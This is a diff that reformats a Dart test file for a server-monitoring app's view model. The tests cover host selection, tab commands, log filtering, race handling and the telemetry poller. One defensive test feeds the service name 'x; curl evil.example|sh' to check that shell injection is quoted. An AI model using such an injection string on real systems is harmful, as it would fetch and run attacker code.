@@ -31,11 +31,7 @@ class RecordingTransport implements SshTransport {
   Completer<void>? gate;
 
   @override
-  Future<String> exec(
-    SshCredentials creds,
-    String command, {
-    String? stdin,
-  }) async {
+  Future<String> exec(SshCredentials creds, String command, {String? stdin}) async {
     commands.add(command);
     stdins.add(stdin);
     if (gate != null) await gate!.future;
@@ -72,10 +68,7 @@ void main() {
 
   setUp(() {
     db = AppDatabase(NativeDatabase.memory());
-    repo = AppRepository(
-      db,
-      SecretStore(storage: FakeSecureStorage(<String, String>{})),
-    );
+    repo = AppRepository(db, SecretStore(storage: FakeSecureStorage(<String, String>{})));
     app = AppState(repo);
   });
 
@@ -84,36 +77,33 @@ void main() {
     await db.close();
   });
 
-  Server server({
-    required String name,
-    String status = 'online',
-    String sudoPassword = '',
-  }) => Server(
-    id: 0,
-    name: name,
-    host: '10.0.0.1',
-    port: 22,
-    username: 'root',
-    serverColor: 'Default',
-    authType: 'password',
-    authPassword: 'pw',
-    sudoPassword: sudoPassword,
-    notes: '',
-    keepAlive: 30,
-    sshCompression: false,
-    persistentSession: false,
-    proxyCommand: '',
-    proxyType: 'none',
-    proxyHost: '',
-    proxyPort: 0,
-    proxyUser: '',
-    proxyPassword: '',
-    agentForwarding: false,
-    healthScore: 100,
-    lastLatency: 0,
-    status: status,
-    authStatus: 'ok',
-  );
+  Server server({required String name, String status = 'online', String sudoPassword = ''}) =>
+      Server(
+        id: 0,
+        name: name,
+        host: '10.0.0.1',
+        port: 22,
+        username: 'root',
+        serverColor: 'Default',
+        authType: 'password',
+        authPassword: 'pw',
+        sudoPassword: sudoPassword,
+        notes: '',
+        keepAlive: 30,
+        sshCompression: false,
+        persistentSession: false,
+        proxyCommand: '',
+        proxyType: 'none',
+        proxyHost: '',
+        proxyPort: 0,
+        proxyUser: '',
+        proxyPassword: '',
+        agentForwarding: false,
+        healthScore: 100,
+        lastLatency: 0,
+        status: status,
+        authStatus: 'ok',
+      );
 
   Future<MonitorViewModel> boot({RecordingTransport? transport}) async {
     await app.start();
@@ -130,17 +120,14 @@ void main() {
       vm.dispose();
     });
 
-    test(
-      'with no explicit selection it falls back to the first online host',
-      () async {
-        await repo.insertServer(server(name: 'down', status: 'offline'));
-        final upId = await repo.insertServer(server(name: 'up'));
-        final vm = await boot();
-        await Future<void>.delayed(Duration.zero);
-        expect(vm.monitoredServer?.id, upId);
-        vm.dispose();
-      },
-    );
+    test('with no explicit selection it falls back to the first online host', () async {
+      await repo.insertServer(server(name: 'down', status: 'offline'));
+      final upId = await repo.insertServer(server(name: 'up'));
+      final vm = await boot();
+      await Future<void>.delayed(Duration.zero);
+      expect(vm.monitoredServer?.id, upId);
+      vm.dispose();
+    });
 
     test('the explicit selection wins when it is online', () async {
       await repo.insertServer(server(name: 'a'));
@@ -163,85 +150,68 @@ void main() {
       await Future<void>.delayed(Duration.zero);
       expect(vm.monitoredServer?.id, aId);
 
-      await repo.updateServer(
-        (await repo.getServerById(aId))!.copyWith(status: 'offline'),
-      );
+      await repo.updateServer((await repo.getServerById(aId))!.copyWith(status: 'offline'));
       await Future<void>.delayed(Duration.zero);
 
-      expect(
-        vm.monitoredServer?.id,
-        bId,
-        reason: 'it falls back to a host that can answer',
-      );
+      expect(vm.monitoredServer?.id, bId, reason: 'it falls back to a host that can answer');
       vm.dispose();
     });
 
-    test(
-      'the last online host going down returns to the empty state',
-      () async {
-        final id = await repo.insertServer(server(name: 'only'));
-        final vm = await boot();
-        await Future<void>.delayed(Duration.zero);
-        expect(vm.hasNoOnlineHosts, isFalse);
+    test('the last online host going down returns to the empty state', () async {
+      final id = await repo.insertServer(server(name: 'only'));
+      final vm = await boot();
+      await Future<void>.delayed(Duration.zero);
+      expect(vm.hasNoOnlineHosts, isFalse);
 
-        await repo.updateServer(
-          (await repo.getServerById(id))!.copyWith(status: 'offline'),
-        );
-        await Future<void>.delayed(Duration.zero);
-        expect(vm.hasNoOnlineHosts, isTrue);
-        vm.dispose();
-      },
-    );
+      await repo.updateServer((await repo.getServerById(id))!.copyWith(status: 'offline'));
+      await Future<void>.delayed(Duration.zero);
+      expect(vm.hasNoOnlineHosts, isTrue);
+      vm.dispose();
+    });
   });
 
   group('tabs', () {
-    test(
-      'refresh fetches what the active tab shows, not host metrics',
-      () async {
-        // Refreshing Monitor on the Services tab has to fetch services.
-        await repo.insertServer(server(name: 'a'));
-        final transport = RecordingTransport();
-        final vm = await boot(transport: transport);
-        await Future<void>.delayed(Duration.zero);
+    test('refresh fetches what the active tab shows, not host metrics', () async {
+      // Refreshing Monitor on the Services tab has to fetch services.
+      await repo.insertServer(server(name: 'a'));
+      final transport = RecordingTransport();
+      final vm = await boot(transport: transport);
+      await Future<void>.delayed(Duration.zero);
 
-        vm.activeTab = MonitorTab.services;
-        await Future<void>.delayed(Duration.zero);
-        expect(transport.commands.last, contains('systemctl list-units'));
+      vm.activeTab = MonitorTab.services;
+      await Future<void>.delayed(Duration.zero);
+      expect(transport.commands.last, contains('systemctl list-units'));
 
-        vm.activeTab = MonitorTab.logs;
-        await Future<void>.delayed(Duration.zero);
-        expect(transport.commands.last, contains('journalctl'));
+      vm.activeTab = MonitorTab.logs;
+      await Future<void>.delayed(Duration.zero);
+      expect(transport.commands.last, contains('journalctl'));
 
-        vm.activeTab = MonitorTab.processes;
-        await Future<void>.delayed(Duration.zero);
-        expect(transport.commands.last, contains('ps -eo'));
-        vm.dispose();
-      },
-    );
+      vm.activeTab = MonitorTab.processes;
+      await Future<void>.delayed(Duration.zero);
+      expect(transport.commands.last, contains('ps -eo'));
+      vm.dispose();
+    });
 
-    test(
-      'overview fetches host metrics and caches the OS for the other tabs',
-      () async {
-        final id = await repo.insertServer(server(name: 'a'));
-        final transport = RecordingTransport(
-          replies: {"echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n'},
-        );
-        final vm = await boot(transport: transport);
-        await Future<void>.delayed(Duration.zero);
-        await vm.loadActiveTab();
+    test('overview fetches host metrics and caches the OS for the other tabs', () async {
+      final id = await repo.insertServer(server(name: 'a'));
+      final transport = RecordingTransport(
+        replies: {"echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n'},
+      );
+      final vm = await boot(transport: transport);
+      await Future<void>.delayed(Duration.zero);
+      await vm.loadActiveTab();
 
-        expect(transport.commands.single, contains('@LOAD'));
-        // Probing uname once and caching it beats every tab asking for itself.
-        expect(app.osForServer(id), 'FreeBSD');
-        await vm.loadProcesses();
-        expect(
-          transport.commands.last,
-          contains('ps -axo'),
-          reason: 'the cached OS must pick the BSD ps variant',
-        );
-        vm.dispose();
-      },
-    );
+      expect(transport.commands.single, contains('@LOAD'));
+      // Probing uname once and caching it beats every tab asking for itself.
+      expect(app.osForServer(id), 'FreeBSD');
+      await vm.loadProcesses();
+      expect(
+        transport.commands.last,
+        contains('ps -axo'),
+        reason: 'the cached OS must pick the BSD ps variant',
+      );
+      vm.dispose();
+    });
   });
 
   group('processes', () {
@@ -253,9 +223,7 @@ void main() {
 
     test('loads and sorts by CPU by default', () async {
       await repo.insertServer(server(name: 'a'));
-      final vm = await boot(
-        transport: RecordingTransport(replies: {'ps -eo': psOutput}),
-      );
+      final vm = await boot(transport: RecordingTransport(replies: {'ps -eo': psOutput}));
       await Future<void>.delayed(Duration.zero);
       await vm.loadProcesses();
 
@@ -295,9 +263,7 @@ void main() {
     test('a host with no service manager says so', () async {
       await repo.insertServer(server(name: 'a'));
       final vm = await boot(
-        transport: RecordingTransport(
-          replies: {'systemctl list-units': '---NOSYSTEMD---'},
-        ),
+        transport: RecordingTransport(replies: {'systemctl list-units': '---NOSYSTEMD---'}),
       );
       await Future<void>.delayed(Duration.zero);
       await vm.loadServices();
@@ -310,33 +276,23 @@ void main() {
       vm.dispose();
     });
 
-    test(
-      'an action sends the sudo password via stdin, never in the command',
-      () async {
-        await repo.insertServer(server(name: 'a', sudoPassword: 'hunter2'));
-        final transport = RecordingTransport();
-        final vm = await boot(transport: transport);
-        await Future<void>.delayed(Duration.zero);
+    test('an action sends the sudo password via stdin, never in the command', () async {
+      await repo.insertServer(server(name: 'a', sudoPassword: 'hunter2'));
+      final transport = RecordingTransport();
+      final vm = await boot(transport: transport);
+      await Future<void>.delayed(Duration.zero);
 
-        await vm.runServiceAction(
-          SimService(
-            name: 'nginx',
-            desc: '',
-            status: 'running',
-            subState: 'active',
-          ),
-          'restart',
-        );
+      await vm.runServiceAction(
+        SimService(name: 'nginx', desc: '', status: 'running', subState: 'active'),
+        'restart',
+      );
 
-        final actionIndex = transport.commands.indexWhere(
-          (c) => c.contains('systemctl restart'),
-        );
-        expect(actionIndex, isNot(-1));
-        expect(transport.commands[actionIndex], isNot(contains('hunter2')));
-        expect(transport.stdins[actionIndex], 'hunter2\n');
-        vm.dispose();
-      },
-    );
+      final actionIndex = transport.commands.indexWhere((c) => c.contains('systemctl restart'));
+      expect(actionIndex, isNot(-1));
+      expect(transport.commands[actionIndex], isNot(contains('hunter2')));
+      expect(transport.stdins[actionIndex], 'hunter2\n');
+      vm.dispose();
+    });
 
     test('a unit name cannot inject a command', () async {
       await repo.insertServer(server(name: 'a'));
@@ -345,18 +301,11 @@ void main() {
       await Future<void>.delayed(Duration.zero);
 
       await vm.runServiceAction(
-        SimService(
-          name: r'x; curl evil.example|sh',
-          desc: '',
-          status: 'dead',
-          subState: 'dead',
-        ),
+        SimService(name: r'x; curl evil.example|sh', desc: '', status: 'dead', subState: 'dead'),
         'restart',
       );
 
-      final cmd = transport.commands.firstWhere(
-        (c) => c.contains('systemctl restart'),
-      );
+      final cmd = transport.commands.firstWhere((c) => c.contains('systemctl restart'));
       expect(
         cmd,
         contains(r"'x; curl evil.example|sh'"),
@@ -373,51 +322,40 @@ void main() {
 2026-08-04T10:00:02+0000 host cron: job timeout waiting
 ''';
 
-    test(
-      'a host with no log source is distinguished from one with no lines',
-      () async {
-        await repo.insertServer(server(name: 'a'));
-        final vm = await boot(
-          transport: RecordingTransport(
-            replies: {'journalctl': '---NOLOGS---'},
-          ),
-        );
-        await Future<void>.delayed(Duration.zero);
-        await vm.loadLogs();
+    test('a host with no log source is distinguished from one with no lines', () async {
+      await repo.insertServer(server(name: 'a'));
+      final vm = await boot(transport: RecordingTransport(replies: {'journalctl': '---NOLOGS---'}));
+      await Future<void>.delayed(Duration.zero);
+      await vm.loadLogs();
 
-        expect(vm.logsUnsupported, isTrue);
-        expect(vm.logs, isEmpty);
-        vm.dispose();
-      },
-    );
+      expect(vm.logsUnsupported, isTrue);
+      expect(vm.logs, isEmpty);
+      vm.dispose();
+    });
 
-    test(
-      'the level filter narrows what was already fetched, without refetching',
-      () async {
-        await repo.insertServer(server(name: 'a'));
-        final transport = RecordingTransport(replies: {'journalctl': journal});
-        final vm = await boot(transport: transport);
-        await Future<void>.delayed(Duration.zero);
-        await vm.loadLogs();
-        final calls = transport.commands.length;
+    test('the level filter narrows what was already fetched, without refetching', () async {
+      await repo.insertServer(server(name: 'a'));
+      final transport = RecordingTransport(replies: {'journalctl': journal});
+      final vm = await boot(transport: transport);
+      await Future<void>.delayed(Duration.zero);
+      await vm.loadLogs();
+      final calls = transport.commands.length;
 
-        expect(vm.filteredLogs, hasLength(3));
+      expect(vm.filteredLogs, hasLength(3));
 
-        vm.logFilter = 'ERROR';
-        expect(transport.commands.length, calls, reason: 'filtering is local');
-        expect(vm.filteredLogs.every((l) => l.level == 'ERROR'), isTrue);
-        expect(
-          vm.filteredLogs,
-          isNotEmpty,
-          reason:
-              '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix',
-        );
+      vm.logFilter = 'ERROR';
+      expect(transport.commands.length, calls, reason: 'filtering is local');
+      expect(vm.filteredLogs.every((l) => l.level == 'ERROR'), isTrue);
+      expect(
+        vm.filteredLogs,
+        isNotEmpty,
+        reason: '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix',
+      );
 
-        vm.logFilter = 'ALL';
-        expect(vm.filteredLogs, hasLength(3));
-        vm.dispose();
-      },
-    );
+      vm.logFilter = 'ALL';
+      expect(vm.filteredLogs, hasLength(3));
+      vm.dispose();
+    });
 
     test('turning live off cancels the timer', () async {
       await repo.insertServer(server(name: 'a'));
@@ -435,90 +373,83 @@ void main() {
   });
 
   group('stale replies', () {
-    test(
-      'a reply for a host the user left does not overwrite the new host',
-      () async {
-        final aId = await repo.insertServer(server(name: 'a'));
-        final bId = await repo.insertServer(server(name: 'b'));
-        final transport = RecordingTransport(
-          replies: {
-            'ps -eo':
-                '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
-                '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
-          },
-        );
-        final vm = await boot(transport: transport);
-        app.selectedServerId = aId;
-        await Future<void>.delayed(Duration.zero);
-
-        transport.gate = Completer<void>();
-        final pending = vm.loadProcesses();
-
-        // The user switches host while the first fetch is still in flight.
-        app.selectedServerId = bId;
-        await Future<void>.delayed(Duration.zero);
-
-        transport.gate!.complete();
-        await pending;
-
-        expect(
-          vm.processes.any((p) => p.name == 'stale-proc'),
-          isFalse,
-          reason:
-              "one machine's processes must never be shown under another's name",
-        );
-        vm.dispose();
-      },
-    );
-
-    test(
-      'an overlapping refresh of the same tab does not land after the newer one',
-      () async {
-        // The host check is not enough: the live timer fires while a manual refresh is in flight, so
-        // two loads of the *same* tab on the *same* host race, and both pass an identity check. This
-        // is what `OperationGeneration` is for — the Kotlin helper the port carried across and, for a
-        // while, never called.
-        await repo.insertServer(server(name: 'a'));
-        final transport = RecordingTransport();
-        final vm = await boot(transport: transport);
-        await Future<void>.delayed(Duration.zero);
-
-        final first = Completer<void>();
-        transport.gate = first;
-        final stale = vm.loadProcesses();
-
-        final second = Completer<void>();
-        transport.gate = second;
-        final fresh = vm.loadProcesses();
-
-        // The newer request answers first.
-        transport.replies = {
-          'ps -eo':
-              '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
-              '  2 root 1.0 1.0 100 01:00:00 S fresh-proc\n',
-        };
-        second.complete();
-        await fresh;
-        expect(vm.processes.single.name, 'fresh-proc');
-
-        // …and the one it superseded answers afterwards.
-        transport.replies = {
+    test('a reply for a host the user left does not overwrite the new host', () async {
+      final aId = await repo.insertServer(server(name: 'a'));
+      final bId = await repo.insertServer(server(name: 'b'));
+      final transport = RecordingTransport(
+        replies: {
           'ps -eo':
               '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
               '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
-        };
-        first.complete();
-        await stale;
+        },
+      );
+      final vm = await boot(transport: transport);
+      app.selectedServerId = aId;
+      await Future<void>.delayed(Duration.zero);
 
-        expect(
-          vm.processes.single.name,
-          'fresh-proc',
-          reason: 'the superseded load must not overwrite the newer result',
-        );
-        expect(vm.processesLoading, isFalse);
-        vm.dispose();
-      },
-    );
+      transport.gate = Completer<void>();
+      final pending = vm.loadProcesses();
+
+      // The user switches host while the first fetch is still in flight.
+      app.selectedServerId = bId;
+      await Future<void>.delayed(Duration.zero);
+
+      transport.gate!.complete();
+      await pending;
+
+      expect(
+        vm.processes.any((p) => p.name == 'stale-proc'),
+        isFalse,
+        reason: "one machine's processes must never be shown under another's name",
+      );
+      vm.dispose();
+    });
+
+    test('an overlapping refresh of the same tab does not land after the newer one', () async {
+      // The host check is not enough: the live timer fires while a manual refresh is in flight, so
+      // two loads of the *same* tab on the *same* host race, and both pass an identity check. This
+      // is what `OperationGeneration` is for — the Kotlin helper the port carried across and, for a
+      // while, never called.
+      await repo.insertServer(server(name: 'a'));
+      final transport = RecordingTransport();
+      final vm = await boot(transport: transport);
+      await Future<void>.delayed(Duration.zero);
+
+      final first = Completer<void>();
+      transport.gate = first;
+      final stale = vm.loadProcesses();
+
+      final second = Completer<void>();
+      transport.gate = second;
+      final fresh = vm.loadProcesses();
+
+      // The newer request answers first.
+      transport.replies = {
+        'ps -eo':
+            '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+            '  2 root 1.0 1.0 100 01:00:00 S fresh-proc\n',
+      };
+      second.complete();
+      await fresh;
+      expect(vm.processes.single.name, 'fresh-proc');
+
+      // …and the one it superseded answers afterwards.
+      transport.replies = {
+        'ps -eo':
+            '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
+            '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
+      };
+      first.complete();
+      await stale;
+
+      expect(
+        vm.processes.single.name,
+        'fresh-proc',
+        reason: 'the superseded load must not overwrite the newer result',
+      );
+      expect(vm.processesLoading, isFalse);
+      vm.dispose();
+    });
 
     test('a load completing after the screen is closed does not throw', () async {
       // Leaving Monitor while a fetch is in flight is ordinary use; notifying a disposed
@@ -561,20 +492,17 @@ void main() {
   });
 
   group('no transport', () {
-    test(
-      'monitoring reports unavailable rather than showing an empty host',
-      () async {
-        await repo.insertServer(server(name: 'a'));
-        final vm = await boot();
-        await Future<void>.delayed(Duration.zero);
+    test('monitoring reports unavailable rather than showing an empty host', () async {
+      await repo.insertServer(server(name: 'a'));
+      final vm = await boot();
+      await Future<void>.delayed(Duration.zero);
 
-        expect(vm.canMonitor, isFalse);
-        await vm.loadServices();
-        expect(vm.error, isNotNull);
-        expect(vm.services, isEmpty);
-        vm.dispose();
-      },
-    );
+      expect(vm.canMonitor, isFalse);
+      await vm.loadServices();
+      expect(vm.error, isNotNull);
+      expect(vm.services, isEmpty);
+      vm.dispose();
+    });
   });
 
   group('the fleet telemetry poller', () {
@@ -584,91 +512,71 @@ void main() {
         '@MEM\nMem: 100 10 0 0 0 90\n'
         '@DISK\n/dev/sda1 100 1 1 1% /\n';
 
-    test(
-      'Monitor shows the poller\'s sample without fetching for itself',
-      () async {
-        // Two loops fetching the same numbers on different cadences is how one screen ends up
-        // disagreeing with another about the same host.
-        final id = await repo.insertServer(server(name: 'a'));
-        await app.start();
+    test('Monitor shows the poller\'s sample without fetching for itself', () async {
+      // Two loops fetching the same numbers on different cadences is how one screen ends up
+      // disagreeing with another about the same host.
+      final id = await repo.insertServer(server(name: 'a'));
+      await app.start();
+      await Future<void>.delayed(Duration.zero);
+
+      final transport = RecordingTransport(fallback: reply);
+      final poller = TelemetryPoller(app, transport: transport);
+      final vm = MonitorViewModel(app, poller: poller);
+      await poller.cycle();
+
+      expect(vm.monitoredServer?.id, id);
+      expect(vm.metrics.memPercent, closeTo(10, 0.001));
+      vm.dispose();
+      poller.dispose();
+    });
+
+    test('the countdown and the sample age come from the poller, not a second timer', () async {
+      await repo.insertServer(server(name: 'a'));
+      await app.start();
+      await Future<void>.delayed(Duration.zero);
+
+      final at = DateTime(2026, 8, 5, 12);
+      final poller = TelemetryPoller(
+        app,
+        transport: RecordingTransport(fallback: reply),
+        interval: const Duration(seconds: 15),
+        clock: () => at,
+      );
+      final vm = MonitorViewModel(app, poller: poller);
+
+      expect(vm.nextRefreshAt, isNull, reason: 'nothing has been sampled yet');
+      await poller.cycle();
+
+      expect(vm.nextRefreshAt, at.add(const Duration(seconds: 15)));
+      expect(vm.metricsSampledAt, at);
+      vm.dispose();
+      poller.dispose();
+    });
+
+    test("the age describes the reading on screen, whichever loop fetched it", () async {
+      // Found on a device: for the first fifteen seconds Overview showed its own fetch while the
+      // line above it said "waiting for the first sample", which reads as "do not trust these".
+      await repo.insertServer(server(name: 'a'));
+      await app.start();
+      await Future<void>.delayed(Duration.zero);
+
+      final poller = TelemetryPoller(app, transport: RecordingTransport(fallback: reply));
+      final vm = MonitorViewModel(
+        app,
+        transport: RecordingTransport(fallback: reply),
+        poller: poller,
+      );
+      expect(vm.metricsSampledAt, isNull, reason: 'nothing has been fetched at all yet');
+
+      await vm.loadHostMetrics();
+      for (var i = 0; i < 5 && vm.metrics.memTotalBytes == 0; i++) {
         await Future<void>.delayed(Duration.zero);
+      }
 
-        final transport = RecordingTransport(fallback: reply);
-        final poller = TelemetryPoller(app, transport: transport);
-        final vm = MonitorViewModel(app, poller: poller);
-        await poller.cycle();
-
-        expect(vm.monitoredServer?.id, id);
-        expect(vm.metrics.memPercent, closeTo(10, 0.001));
-        vm.dispose();
-        poller.dispose();
-      },
-    );
-
-    test(
-      'the countdown and the sample age come from the poller, not a second timer',
-      () async {
-        await repo.insertServer(server(name: 'a'));
-        await app.start();
-        await Future<void>.delayed(Duration.zero);
-
-        final at = DateTime(2026, 8, 5, 12);
-        final poller = TelemetryPoller(
-          app,
-          transport: RecordingTransport(fallback: reply),
-          interval: const Duration(seconds: 15),
-          clock: () => at,
-        );
-        final vm = MonitorViewModel(app, poller: poller);
-
-        expect(
-          vm.nextRefreshAt,
-          isNull,
-          reason: 'nothing has been sampled yet',
-        );
-        await poller.cycle();
-
-        expect(vm.nextRefreshAt, at.add(const Duration(seconds: 15)));
-        expect(vm.metricsSampledAt, at);
-        vm.dispose();
-        poller.dispose();
-      },
-    );
-
-    test(
-      "the age describes the reading on screen, whichever loop fetched it",
-      () async {
-        // Found on a device: for the first fifteen seconds Overview showed its own fetch while the
-        // line above it said "waiting for the first sample", which reads as "do not trust these".
-        await repo.insertServer(server(name: 'a'));
-        await app.start();
-        await Future<void>.delayed(Duration.zero);
-
-        final poller = TelemetryPoller(
-          app,
-          transport: RecordingTransport(fallback: reply),
-        );
-        final vm = MonitorViewModel(
-          app,
-          transport: RecordingTransport(fallback: reply),
-          poller: poller,
-        );
-        expect(
-          vm.metricsSampledAt,
-          isNull,
-          reason: 'nothing has been fetched at all yet',
-        );
-
-        await vm.loadHostMetrics();
-        for (var i = 0; i < 5 && vm.metrics.memTotalBytes == 0; i++) {
-          await Future<void>.delayed(Duration.zero);
-        }
-
-        expect(vm.metricsSampledAt, isNotNull);
-        vm.dispose();
-        poller.dispose();
-      },
-    );
+      expect(vm.metricsSampledAt, isNotNull);
+      vm.dispose();
+      poller.dispose();
+    });
 
     test('with no poller Monitor still fetches for itself', () async {
       // Every build without SSH wired, and the manual refresh in the ones that have it.
@@ -688,22 +596,17 @@ void main() {
     });
   });
 
-  test(
-    'a credential failure surfaces as an error, not as a blank tab',
-    () async {
-      await repo.insertServer(
-        server(
-          name: 'a',
-        ).copyWith(authType: 'key', authKeyAlias: const Value('gone')),
-      );
-      final vm = await boot(transport: RecordingTransport());
-      await Future<void>.delayed(Duration.zero);
-      await vm.loadProcesses();
+  test('a credential failure surfaces as an error, not as a blank tab', () async {
+    await repo.insertServer(
+      server(name: 'a').copyWith(authType: 'key', authKeyAlias: const Value('gone')),
+    );
+    final vm = await boot(transport: RecordingTransport());
+    await Future<void>.delayed(Duration.zero);
+    await vm.loadProcesses();
 
-      expect(vm.error, contains('gone'));
-      vm.dispose();
-    },
-  );
+    expect(vm.error, contains('gone'));
+    vm.dispose();
+  });
 
   /// The retained 7-day history, ported from the `7-DAY HISTORY` block in `ui/MonitorScreen.kt:768`.
   ///
